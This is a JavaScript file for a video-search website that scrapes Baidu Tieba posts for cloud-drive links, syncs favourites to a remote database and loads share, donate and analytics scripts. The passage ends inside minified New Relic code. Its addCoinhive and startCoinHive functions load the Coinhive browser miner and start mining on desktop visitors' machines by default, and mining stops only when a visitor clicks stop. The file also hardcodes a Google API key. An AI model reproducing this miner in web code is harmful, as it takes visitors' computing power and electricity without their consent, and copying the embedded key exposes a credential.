        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                var p_title = as[i].querySelector(".p_title").innerHTML;
                var refUrlIndex = p_title.indexOf('href="')+6;
                var refUrlEnd = p_title.indexOf('"',refUrlIndex);
                var refUrl = p_title.substring(refUrlIndex,refUrlEnd)
                var html = p_title+as[i].querySelector(".p_content").innerHTML;
                
                var key = getkey(html);
                var string = as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText;
                var keyIndex = string.lastIndexOf(key);
                var name = string.slice(keyIndex);
                var url = getUrl(string,keyIndex);
                
                if(key&&check(url)){
                    videos.push({name:string,url:url,refUrl:"http://tieba.baidu.com"+refUrl});
                }

            }
            return videos;
            function check(url){
                if(!url){
                    return false;
                }
                if(url.indexOf("pan.baidu.com/mbox")>0){
                    return false;
                }
                return true;
            }
            function getUrl(string,keyIndex){
                var keyIndex2 = keyIndex?keyIndex:0;
                var urlIndex = string.indexOf("http",keyIndex2);
                if(urlIndex>=0){
                    var url = string.slice(urlIndex);
                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
                    var match = url.match(regexp);
                    url = url.slice(0,match.index);
                    return url;
                }else{
                    if(keyIndex){
                        return getUrl(string);
                    }
                }
                return "";
            }
            function getkey(html){
                var wrapper= document.createElement('div');
                wrapper.innerHTML= html;
                var ems = wrapper.querySelectorAll("em");
                for(var i = ems.length-1;i>=0;i--){
                    if(ems[i].innerText!="pan.baidu"){
                        return ems[i].innerText;
                    }
                }
                return "";
            }
        }
    }
//     parameter.setIframe = function (videos,length,showVideos){
//         var videos = videos.splice(0,length);
//         window.showVideos = window.showVideos.concat(videos);
//         videos.map(function(video,index){
//             setIframe(video,index==0,false);
//         });
//     }
    
    return fetcher(parameter);

}


function checkExistUk(video,videos){
    try{
        var newUk = getURLParameter("uk",video.url);
        for(var i = 0;i<videos.length;i++){
            var object = videos[i];
            var uk = getURLParameter("uk",object.url);
            if(newUk&&newUk==uk){
                return true;
            }
        };
    }catch(e){
        return true;
    }
    return false;
}

function syncIsIt(key,data){

    var self = {};

    self.key = key|| config.key;
    self.data = data|| JSON.parse(localStorage.getItem(self.key)||"{}");

    self.uri = "https://postgrest-taifu.herokuapp.com/testisit3";
    self.getBykey = function(key){

        var key = (key||self.key);
        var method = "get";
        var uri = self.uri+"?order=install_date.desc&key=eq."+key;
        var fn = function(data){
            console.log(data);
            self.setIframe(data);
            setLocal(key,data);
        }
        ajax(uri,fn,null,method,null);
        return self;
    }
    self.setIframe = function (data,id,setKey){
        var data = (typeof data === "string")?JSON.parse(data):data;
        data.map(function(o){

            var video = JSON.parse(o.video);
            if(video){
                video.key = o.key;
                setIframe(video,true,null,null,id);
            }
        });
    }
    self.setLocalIframe = function(data){
        for(var key in data){
            var video = data[key];
            video.key = key;
            setIframe(video,true,null,null);
        }
    }
    self.getAll = function(){
        var method = "get";
        var uri = self.uri+"?order=install_date.desc&limit=5";
        var fn = function(data){
            console.log(data);
            self.setIframe(data,"dataIsIt",true);
            setLocal(key,data);
        }
        ajax(uri,fn,null,method,null);
    }
    function setLocal(key,data){
        var values = JSON.parse(localStorage.getItem(key)||"{}");
        var data = JSON.parse(data);
        data.map(function(o){
            if(o.key==key){
                values[o.url]=o.count;
            }
        });
        localStorage.setItem(key, JSON.stringify(values));
        data = null;
    }
    self.add = function(key,video){
        

//         var method = "post";
//         var uri = self.uri;
//         var data = {url:video.url,key:key};
//         var fn = function(data){
//             console.log(data);
//         }
//         ajax(uri,fn,null,method,data,"application/json");


        var client = new XMLHttpRequest();
        client.open("POST", self.uri);
        client.setRequestHeader("Content-Type", "application/json");
        client.send(JSON.stringify({url:video.url,key:key,video:JSON.stringify(video)}));
    }
    self.delete = function(key,video){
        var method = "delete";
        var uri = self.uri+"?key=eq."+key+"&url=eq."+video.url;
        var fn = function(data){
            console.log(data);
        }
        ajax(uri,fn,null,method,null,"application/json");
    }

    return self;
}

function isItClick(isIt){
//     if(!isIt.checked){
//         isIt.checked = true;
//         isIt.disabled = true;
//         return;
//     }
    var key = isIt.dataset.key||config.key;
    
    storageItTrue(key,isIt,!isIt.checked);
//     isIt.disabled = true;
    isIt.classList.add("checked");
    var share = document.querySelector(".share-other");
    share.setAttribute("checked",isIt.checked);
//     if(iniframe()){
//         addShare(key);
//     }
}

function storageItTrue(key,isIt,remove){
    var video = JSON.parse(isIt.value);
    var values = JSON.parse(localStorage.getItem(key)||"{}");
    values[video.url] = remove?false:video;
    localStorage.setItem(key, JSON.stringify(values));

    var sync = syncIsIt(key,values);
    if(remove){
        sync.delete(key,video);
    }else{
        sync.add(key,video);
        moveItemToTop(isIt);
    }
}
function moveItemToTop(isIt){
    var videoItem = closest(isIt, ".video-item");
    var dataD = videoItem.parentNode;
//     videoItem = dataD.removeChild(videoItem);
    dataD.insertBefore(videoItem,dataD.childNodes[0]);
    document.querySelector('a[href="#data"]').click();
}
function isItTrue(isIt){
    var key = config.key;
    var video = JSON.parse(isIt.value);
    var values = JSON.parse(localStorage.getItem(key)||"{}");
    if(values[video.url]){
        return true;
    }
    return false;
}
function closest(el, selector, stopSelector) {
  var retval = null;
  while (el) {
    if (el.matches(selector)) {
      retval = el;
      break
    } else if (stopSelector && el.matches(stopSelector)) {
      break
    }
    el = el.parentElement;
  }
  return retval;
}

function importCSS(href,cssId){
    var cssId = cssId||'myCss';  // you could encode the css path itself to generate id..
    if (!document.getElementById(cssId))
    {
        var head  = document.getElementsByTagName('head')[0];
        var link  = document.createElement('link');
        link.id   = cssId;
        link.rel  = 'stylesheet';
        link.type = 'text/css';
        link.href = href;
        link.media = 'all';
        head.appendChild(link);
    }
}
function loadShare(key){

    window.money = Money();
    addCoinhive();
    
    addDonate();
    importCSS("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css","awesome");
    addShare(key);
    if(!inIframe()){
        document.querySelector(".nav-index").style.display = "block";

    }
}
function addShare(key){

    if(!window.importShare){
        document.querySelector(".share-other").innerHTML= document.getElementById("shareTemplate").innerHTML;
        window.importShare = importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/qrcode.js",function(){
            importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/social-share.js",function(){
        //         var ele = document.querySelector(".share-other");
        //         ele.dataset.weiboTitle = key+"有诶";
                if(key){
                    document.querySelector(".share-other").dataset.footnote = key;
                    socialShare(".share-other",{title:key});
                }else{
                    socialShare(".share-other");
                }
            });
        });

        importCSS("https://overtrue.github.io/share.js/dist/css/share.min.css");
    //     ajax("http://api.t.sina.com.cn/short_url/shorten.xml?source=3271760578&url_long=")
        window._bd_share_config={
            "common":{
                "bdSnsKey":{},"bdText":key||'',"bdMini":"2","bdMiniList":false,
                "bdPic":(document.images[0] || 0).src || '',"bdStyle":"1","bdSize":"32"
            },"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://wuchaolong.github.io/baiduShare/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
    }
}
function addDonate(){
    var donateTemplate = document.getElementById("donateTemplate");
    var donateD = document.getElementById("donate");
    var spanHtml = config.feedback.lang();
//     var spanHtml = "";
    donateD.innerHTML = spanHtml+donateTemplate.innerHTML;
//     donateD.querySelector("span").click();
    donateTemplate = donateD = null;
//     if(config.userLang=="zh-CN"){
//         var iframe = document.querySelector("#donate iframe");
//         iframe.onload = function() {
//             showAlipay();
//         }
//     }

    
}

function showAlipay(){
    var iframe = document.querySelector("#donate iframe");
    (iframe.contentDocument || iframe.contentWindow.document).getElementById("AliPay").click();
}
function showPayPal(){
    var iframe = document.querySelector("#donate iframe");
    (iframe.contentDocument || iframe.contentWindow.document).querySelector("#PayPal a").click();

}
function addBookmark(){
  var bookmark = document.createElement("span");
  bookmark.classList.add("bookmark");
//   bookmark.href="javascript:return void();";
  bookmark.title="Bookmark me";
  bookmark.onclick = addFavorite;
  var top = document.getElementById("top");
//   top.innerHTML = '<span class="confirm-bookmark">Bookmark me</span>';
  top.appendChild(bookmark);
//   var result = confirm(config.bookmark.lang());
//   if(result){
      bookmark.click();
      
//       localStorage.setItem("bookmarked",true);
//   }
  function addFavorite(e) {
      try{
            
            var bookmarkURL = "https://wuchaolong.github.io/video/"||window.location.href;
            var bookmarkTitle = "Video"||document.title;
            var confirm = config.bookmark.lang();



            if(/Mac/i.test(navigator.userAgent)){
                alert('Cmd+D '+confirm);
            }else{

                alert('Ctrl+D '+confirm);
            }
            
            if ('addToHomescreen' in window && addToHomescreen.isCompatible) {
              // Mobile browsers
              addToHomescreen({ autostart: false, startDelay: 0 }).show(true);
            } else if (window.sidebar && window.sidebar.addPanel) {
              // Firefox <=22
              window.sidebar.addPanel(bookmarkTitle, bookmarkURL, '');
            } else if ((window.sidebar && /Firefox/i.test(navigator.userAgent)) || (window.opera && window.print)) {
              // Firefox 23+ and Opera <=14
        //       $(this).attr({
        //         href: bookmarkURL,
        //         title: bookmarkTitle,
        //         rel: 'sidebar'
        //       }).off(e);

              bookmark.href=bookmarkURL;
              bookmark.title=bookmarkTitle;
              bookmark.rel = "sidebar";
              bookmark.removeEventListener('click', addFavorite);

            } else if (window.external && ('AddFavorite' in window.external)) {
              // IE Favorites
              window.external.AddFavorite(bookmarkURL, bookmarkTitle);
            }
      }catch(e){
          console.log(e);
          return false;
      }
    
    hideBookmark(bookmark);
    return false;
  }
}
function hideBookmark(bookmark){
    document.getElementById("top").removeChild(bookmark);
    localStorage.setItem("bookmarked",true);
}
function isShowBookmark(){
    var bookmarked = localStorage.getItem("bookmarked");
    var isOlduser = localStorage.getItem("doubanSearchs");
    var isDirect = localStorage.getItem("isDirect");
    if(!bookmarked&&isOlduser&&!isDirect){
        return true;
    }
    return false;
}
function isDirect(){
    var referrer = document.createElement('a');
    referrer.href = document.referrer;
    var url = document.createElement('a');
    url.href = location.href;
//     localStorage.setItem("isOlduser",true);
    if(!document.referrer){
        localStorage.setItem("isDirect",true);
        return true;
    }
    return false;
}

function addCoinhive(){
    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
            miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
            if (!miner.isMobile() && !miner.didOptOut(14400)) {
                if(!localStorage.getItem("removeCoinHive")){
                    startCoinHive();
                }else{
                    stopCoinHive();
                }
            }
        })
    }
}
function startCoinHive(){
    localStorage.removeItem("removeCoinHive");

    clearInterval(miner.interval);
    miner.start(CoinHive.IF_EXCLUSIVE_TAB);
    // Update stats once per second

    miner.interval = setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        var html = '<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'
            +totalHashes+'</a><button title="stop" onclick="stopCoinHive()">✗</button>';
        // Output to HTML elements...
        document.querySelector(".coinhive-miner").innerHTML = html;
        money.setHash(totalHashes);
    }, 1000);
}
function stopCoinHive(){

    localStorage.setItem("removeCoinHive",true);
    clearInterval(miner.interval);
    miner.stop();
    miner.interval = setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        var html = '<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'
            +totalHashes+'</a><button title="start" onclick="startCoinHive()">▶</button>';
        // Output to HTML elements...
        document.querySelector(".coinhive-miner").innerHTML = html;
    }, 1000);
//     showAlipay();
}

function loadGoogleEntitie(){
    importScript('https://kgsearch.googleapis.com/v1/entities:search?query='+config.key+'&key=AIzaSyDTtLX1_UqEksS2zp3SAF1vMaGi3OyfJok&limit=5&indent=True&types=Movie&types=TVSeries&callback=setGoogleEntities&languages='+config.userLang+'&languages=en');    
}

function setGoogleEntities(data){
    var html  = "";
    var subjects = data.itemListElement;
    for(var i = 0;i<5&&i<subjects.length;i++){
        if(typeof subjects[i].result.name == "string"){
            var name = subjects[i].result.name;
            html += searchToHtml(name);

        }else{
            var name = subjects[i].result.name[0]["@value"];
            html += searchToHtml(name);
            var lastName = subjects[i].result.name[subjects[i].result.name.length-1]["@value"];
            if(i==0&&name!==lastName){
                html += searchToHtml(lastName);
            }
        }
    }
    var googleEntitiesD = document.getElementById("googleEntities");
    googleEntitiesD.innerHTML=html;
    googleEntitiesD.style.display = "block";
    googleEntitiesD.classList.add("doubanList");
    data=html=subjects=googleEntitiesD=null;
}



function inIframe () {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
}
function mobilecheck() {
  var check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};

String.prototype.format = function()
{
    var args = arguments;
    return this.replace(/\{(\d+)\}/g,                
        function(m,i){
            return args[i];
        });
}

Array.prototype.move = function (old_index, new_index) {
    if (new_index >= this.length) {
        var k = new_index - this.length;
        while ((k--) + 1) {
            this.push(undefined);
        }
    }
    this.splice(new_index, 0, this.splice(old_index, 1)[0]);
    return this; // for testing purposes
};
Object.prototype.lang=function(){
    return this[config.userLang]||this.default;
}
function addAnalytics(){
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-105323849-1', 'auto');
    ga('send', 'pageview');
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement("script");
    hm.src = "https://hm.baidu.com/hm.js?8b3f6e2c94f875da6eedafba4337f6c1";
    var s = document.getElementsByTagName("script")[0]; 
    s.parentNode.insertBefore(hm, s);
    })();


window.NREUM||(NREUM={}),__nr_require=function(t,n,e){function r(e){if(!n[e]){var o=n[e]={exports:{}};t[e][0].call(o.exports,function(n){var o=t[e][1][n];return r(o||n)},o,o.exports)}return n[e].exports}if("function"==typeof __nr_require)return __nr_require;for(var o=0;o<e.length;o++)r(e[o]);return r}({1:[function(t,n,e){function r(t){try{s.console&&console.log(t)}catch(n){}}var o,i=t("ee"),a=t(15),s={};try{o=localStorage.getItem("__nr_flags").split(","),console&&"function"==typeof console.log&&(s.console=!0,o.indexOf("dev")!==-1&&(s.dev=!0),o.indexOf("nr_dev")!==-1&&(s.nrDev=!0))}catch(c){}s.nrDev&&i.on("internal-error",function(t){r(t.stack)}),s.dev&&i.on("fn-err",function(t,n,e){r(e.stack)}),s.dev&&(r("NR AGENT IN DEVELOPMENT MODE"),r("flags: "+a(s,function(t,n){return t}).join(", ")))},{}],2:[function(t,n,e){function r(t,n,e,r,s){try{p?p-=1:o(s||new UncaughtException(t,n,e),!0)}catch(f){try{i("ierr",[f,c.now(),!0])}catch(d){}}return"function"==typeof u&&u.apply(this,a(arguments))}function UncaughtException(t,n,e){this.message=t||"Uncaught error with no additional information",this.sourceURL=n,this.line=e}function o(t,n){var e=n?null:c.now();i("err",[t,e])}var i=t("handle"),a=t(16),s=t("ee"),c=t("loader"),f=t("gos"),u=window.onerror,d=!1,l="nr@seenError",p=0;c.features.err=!0,t(1),window.onerror=r;try{throw new Error}catch(h){"stack"in h&&(t(8),t(7),"addEventListener"in window&&t(5),c.xhrWrappable&&t(9),d=!0)}s.on("fn-start",function(t,n,e){d&&(p+=1)}),s.on("fn-err",function(t,n,e){d&&!e[l]&&(f(e,l,function(){return!0}),this.thrown=!0,o(e))}),s.on("fn-end",function(){d&&!this.thrown&&p>0&&(p-=1)}),s.on("internal-error",function(t){i("ierr",[t,c.now(),!0])})},{}],3:[function(t,n,e){t("loader").features.ins=!0},{}],4:[function(t,n,e){function r(t){}if(window.performance&&window.performance.timing&&window.performance.getEntriesByType){var o=t("ee"),i=t("handle"),a=t(8),s=t(7),c="learResourceTimings",f="addEventListener",u="resourcetimingbufferfull",d="bstResource",l="resource",p="-start",h="-end",m="fn"+p,w="fn"+h,v="bstTimer",y="pushState",g=t("loader");g.features.stn=!0,t(6);var b=NREUM.o.EV;o.on(m,function(t,n){var e=t[0];e instanceof b&&(this.bstStart=g.now())}),o.on(w,function(t,n){var e=t[0];e instanceof b&&i("bst",[e,n,this.bstStart,g.now()])}),a.on(m,function(t,n,e){this.bstStart=g.now(),this.bstType=e}),a.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),this.bstType])}),s.on(m,function(){this.bstStart=g.now()}),s.on(w,function(t,n){i(v,[n,this.bstStart,g.now(),"requestAnimationFrame"])}),o.on(y+p,function(t){this.time=g.now(),this.startPath=location.pathname+location.hash}),o.on(y+h,function(t){i("bstHist",[location.pathname+location.hash,this.startPath,this.time])}),f in window.performance&&(window.performance["c"+c]?window.performance[f](u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["c"+c]()},!1):window.performance[f]("webkit"+u,function(t){i(d,[window.performance.getEntriesByType(l)]),window.performance["webkitC"+c]()},!1)),document[f]("scroll",r,{passive:!0}),document[f]("keypress",r,!1),document[f]("click",r,!1)}},{}],5:[function(t,n,e){function r(t){for(var n=t;n&&!n.hasOwnProperty(u);)n=Object.getPrototypeOf(n);n&&o(n)}function o(t){s.inPlace(t,[u,d],"-",i)}function i(t,n){return t[1]}var a=t("ee").get("events"),s=t(18)(a,!0),c=t("gos"),f=XMLHttpRequest,u="addEventListener",d="removeEventListener";n.exports=a,"getPrototypeOf"in Object?(r(document),r(window),r(f.prototype)):f.prototype.hasOwnProperty(u)&&(o(window),o(f.prototype)),a.on(u+"-start",function(t,n){var e=t[1],r=c(e,"nr@wrapped",function(){function t(){if("function"==typeof e.handleEvent)return e.handleEvent.apply(e,arguments)}var n={object:t,"function":e}[typeof e];return n?s(n,"fn-",null,n.name||"anonymous"):e});this.wrapped=t[1]=r}),a.on(d+"-start",function(t){t[1]=this.wrapped||t[1]})},{}],6:[function(t,n,e){var r=t("ee").get("history"),o=t(18)(r);n.exports=r,o.inPlace(window.history,["pushState","replaceState"],"-")},{}],7:[function(t,n,e){var r=t("ee").get("raf"),o=t(18)(r),i="equestAnimationFrame";n.exports=r,o.inPlace(window,["r"+i,"mozR"+i,"webkitR"+i,"msR"+i],"raf-"),r.on("raf-start",function(t){t[0]=o(t[0],"fn-")})},{}],8:[function(t,n,e){function r(t,n,e){t[0]=a(t[0],"fn-",null,e)}function o(t,n,e){this.method=e,this.timerDuration=isNaN(t[1])?0:+t[1],t[0]=a(t[0],"fn-",this,e)}var i=t("ee").get("timer"),a=t(18)(i),s="setTimeout",c="setInterval",f="clearTimeout",u="-start",d="-";n.exports=i,a.inPlace(window,[s,"setImmediate"],s+d),a.inPlace(window,[c],c+d),a.inPlace(window,[f,"clearImmediate"],f+d),i.on(c+u,r),i.on(s+u,o)},{}],9:[function(t,n,e){function r(t,n){d.inPlace(n,["onreadystatechange"],"fn-",s)}function o(){var t=this,n=u.context(t);t.readyState>3&&!n.resolved&&(n.resolved=!0,u.emit("xhr-resolved",[],t)),d.inPlace(t,y,"fn-",s)}function i(t){g.push(t),h&&(x?x.then(a):w?w(a):(E=-E,O.data=E))}function a(){for(var t=0;t<g.length;t++)r([],g[t]);g.length&&(g=[])}function s(t,n){return n}function c(t,n){for(var e in t)n[e]=t[e];return n}t(5);var f=t("ee"),u=f.get("xhr"),d=t(18)(u),l=NREUM.o,p=l.XHR,h=l.MO,m=l.PR,w=l.SI,v="readystatechange",y=["onload","onerror","onabort","onloadstart","onloadend","onprogress","ontimeout"],g=[];n.exports=u;var b=window.XMLHttpRequest=function(t){var n=new p(t);try{u.emit("new-xhr",[n],n),n.addEventListener(v,o,!1)}catch(e){try{u.emit("internal-error",[e])}catch(r){}}return n};if(c(p,b),b.prototype=p.prototype,d.inPlace(b.prototype,["open","send"],"-xhr-",s),u.on("send-xhr-start",function(t,n){r(t,n),i(n)}),u.on("open-xhr-start",r),h){var x=m&&m.resolve();if(!w&&!m){var E=1,O=document.createTextNode(E);new h(a).observe(O,{characterData:!0})}}else f.on("fn-end",function(t){t[0]&&t[0].type===v||a()})},{}],10:[function(t,n,e){function r(t){var n=this.params,e=this.metrics;if(!this.ended){this.ended=!0;for(var r=0;r<d;r++)t.removeEventListener(u[r],this.listener,!1);if(!n.aborted){if(e.duration=a.now()-this.startTime,4===t.readyState){n.status=t.status;var i=o(t,this.lastSize);if(i&&(e.rxSize=i),this.sameOrigin){var c=t.getResponseHeader("X-NewRelic-App-Data");c&&(n.cat=c.split(", ").pop())}}else n.status=0;e.cbTime=this.cbTime,f.emit("xhr-done",[t],t),s("xhr",[n,e,this.startTime])}}}function o(t,n){var e=t.responseType;if("json"===e&&null!==n)return n;var r="arraybuffer"===e||"blob"===e||"json"===e?t.response:t.responseText;return h(r)}function i(t,n){var e=c(n),r=t.params;r.host=e.hostname+":"+e.port,r.pathname=e.pathname,t.sameOrigin=e.sameOrigin}var a=t("loader");if(a.xhrWrappable){var s=t("handle"),c=t(11),f=t("ee"),u=["load","error","abort","timeout"],d=u.length,l=t("id"),p=t(14),h=t(13),m=window.XMLHttpRequest;a.features.xhr=!0,t(9),f.on("new-xhr",function(t){var n=this;n.totalCbs=0,n.called=0,n.cbTime=0,n.end=r,n.ended=!1,n.xhrGuids={},n.lastSize=null,p&&(p>34||p<10)||window.opera||t.addEventListener("progress",function(t){n.lastSize=t.loaded},!1)}),f.on("open-xhr-start",function(t){this.params={method:t[0]},i(this,t[1]),this.metrics={}}),f.on("open-xhr-end",function(t,n){"loader_config"in NREUM&&"xpid"in NREUM.loader_config&&this.sameOrigin&&n.setRequestHeader("X-NewRelic-ID",NREUM.loader_config.xpid)}),f.on("send-xhr-start",function(t,n){var e=this.metrics,r=t[0],o=this;if(e&&r){var i=h(r);i&&(e.txSize=i)}this.startTime=a.now(),this.listener=function(t){try{"abort"===t.type&&(o.params.aborted=!0),("load"!==t.type||o.called===o.totalCbs&&(o.onloadCalled||"function"!=typeof n.onload))&&o.end(n)}catch(e){try{f.emit("internal-error",[e])}catch(r){}}};for(var s=0;s<d;s++)n.addEventListener(u[s],this.listener,!1)}),f.on("xhr-cb-time",function(t,n,e){this.cbTime+=t,n?this.onloadCalled=!0:this.called+=1,this.called!==this.totalCbs||!this.onloadCalled&&"function"==typeof e.onload||this.end(e)}),f.on("xhr-load-added",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&!this.xhrGuids[e]&&(this.xhrGuids[e]=!0,this.totalCbs+=1)}),f.on("xhr-load-removed",function(t,n){var e=""+l(t)+!!n;this.xhrGuids&&this.xhrGuids[e]&&(delete this.xhrGuids[e],this.totalCbs-=1)}),f.on("addEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-added",[t[1],t[2]],n)}),f.on("removeEventListener-end",function(t,n){n instanceof m&&"load"===t[0]&&f.emit("xhr-load-removed",[t[1],t[2]],n)}),f.on("fn-start",function(t,n,e){n instanceof m&&("onload"===e&&(this.onload=!0),("load"===(t[0]&&t[0].type)||this.onload)&&(this.xhrCbStart=a.now()))}),f.on("fn-end",function(t,n){this.xhrCbStart&&f.emit("xhr-cb-time",[a.now()-this.xhrCbStart,this.onload,n],n)})}},{}],11:[function(t,n,e){n.exports=function(t){var n=document.createElement("a"),e=window.location,r={};n.href=t,r.port=n.port;var o=n.href.split("://");!r.port&&o[1]&&(r.port=o[1].split("/")[0].split("@").pop().split(":")[1]),r.port&&"0"!==r.port||(r.port="https"===o[0]?"443":"80"),r.hostname=n.hostname||e.hostname,r.pathname=n.pathname,r.protocol=o[0],"/"!==r.pathname.charAt(0)&&(r.pathname="/"+r.pathname);var i=!n.protocol||":"===n.protocol||n.protocol===e.protocol,a=n.hostname===document.domain&&n.port===e.port;return r.sameOrigin=i&&(!n.hostname||a),r}},{}],12:[function(t,n,e){function r(){}function o(t,n,e){return function(){return i(t,[f.now()].concat(s(arguments)),n?null:this,e),n?void 0:this}}var i=t("handle"),a=t(15),s=t(16),c=t("ee").get("tracer"),f=t("loader"),u=NREUM;"undefined"==typeof window.newrelic&&(newrelic=u);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],l="api-",p=l+"ixn-";a(d,function(t,n){u[n]=o(l+n,!0,"api")}),u.addPageAction=o(l+"addPageAction",!0),u.setCurrentRouteName=o(l+"routeName",!0),n.exports=newrelic,u.interaction=function(){return(new r).get()};var h=r.prototype={createTracer:function(t,n){var e={},r=this,o="function"==typeof n;return i(p+"tracer",[f.now(),t,e],r),function(){if(c.emit((o?"":"no-")+"fn-start",[f.now(),r,o],e),o)try{return n.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],e),t}finally{c.emit("fn-end",[f.now()],e)}}}};a("setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,n){h[n]=o(p+n)}),newrelic.noticeError=function(t){"string"==typeof t&&(t=new Error(t)),i("err",[t,f.now()])}},{}],13:[function(t,n,e){n.exports=function(t){if("string"==typeof t&&t.length)return t.length;if("object"==typeof t){if("undefined"!=typeof ArrayBuffer&&t instanceof ArrayBuffer&&t.byteLength)return t.byteLength;if("undefined"!=typeof Blob&&t instanceof Blob&&t.size)return t.size;if(!("undefined"!=typeof FormData&&t instanceof FormData))try{return JSON.stringify(t).length}catch(n){return}}}},{}],14:[function(t,n,e){var r=0,o=navigator.userAgent.match(/Firefox[\/\s](\d+\.\d+)/);o&&(r=+o[1]),n.exports=r},{}],15:[function(t,n,e){function r(t,n){var e=[],r="",i=0;for(r in t)o.call(t,r)&&(e[i]=n(r,t[r]),i+=1);return e}var o=Object.prototype.hasOwnProperty;n.exports=r},{}],16:[function(t,n,e){function r(t,n,e){n||(n=0),"undefined"==typeof e&&(e=t?t.length:0);for(var r=-1,o=e-n||0,i=Array(o<0?0:o);++r<o;)i[r]=t[n+r];return i}n.exports=r},{}],17:[function(t,n,e){n.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],18:[function(t,n,e){function r(t){return!(t&&t instanceof Function&&t.apply&&!t[a])}var o=t("ee"),i=t(16),a="nr@original",s=Object.prototype.hasOwnProperty,c=!1;n.exports=function(t,n){function e(t,n,e,o){function nrWrapper(){var r,a,s,c;try{a=this,r=i(arguments),s="function"==typeof 